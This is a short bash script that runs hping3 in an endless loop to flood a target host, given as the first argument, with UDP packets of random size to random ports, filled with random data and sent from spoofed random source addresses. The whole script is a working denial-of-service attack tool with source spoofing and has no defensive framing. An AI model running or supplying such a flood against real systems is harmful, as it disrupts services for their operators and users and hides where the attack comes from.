#!/bin/bash

while true;
do
    PACKSIZE=`echo $RANDOM % 1500 | bc`;
    RNDPORT=`echo $RANDOM % 65535 | bc`;
    hping3 --udp -i u1 -p $RNDPORT -c 2000 -d $PACKSIZE --file /dev/urandom --rand-source $1;
done
